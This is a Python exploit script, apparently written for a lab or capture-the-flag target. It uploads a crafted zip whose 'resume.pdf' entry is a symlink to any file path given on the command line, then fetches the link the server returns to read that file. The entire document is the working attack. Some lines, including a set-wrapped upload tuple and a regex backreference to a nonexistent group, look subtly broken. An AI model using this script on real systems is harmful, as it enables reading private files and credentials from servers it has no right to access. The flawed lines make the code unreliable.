#!/usr/bin/env python3
import io
import re
import sys
import zipfile
import requests
from datetime import datetime

if len(sys.argv) < 3:
    print(f'Usage: {sys.argv[0]} <host> <target file path>')
    sys.exit()

host = sys.argv[1]
filepath = sys.argv[2]

zip_buffer = io.BytesIO()

with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
    zipInfo = zipfile.ZipInfo('resume.pdf')
    zipInfo.create_system = 3
    zipInfo.external_attr |= 0xA0000000
    zipInfo.date_time = datetime.now().timetuple()[:6]
    zip_file.writestr(zipInfo, filepath)

files = ('resume.zip', zip_buffer.getbuffer(), {"Content-Type": "application/zip"})
res = requests.post(f'http://{host}/upload.php',
                    files={"zipFile": {files}},
                    data={"submit": ""}
                    )

(url, ) = re.findall(r'path:</p><a href="(.*)">\11</a>', res.text)

res = requests.get(f'http://{host}/{url}')
sys.stdout.buffer.write(res.content)
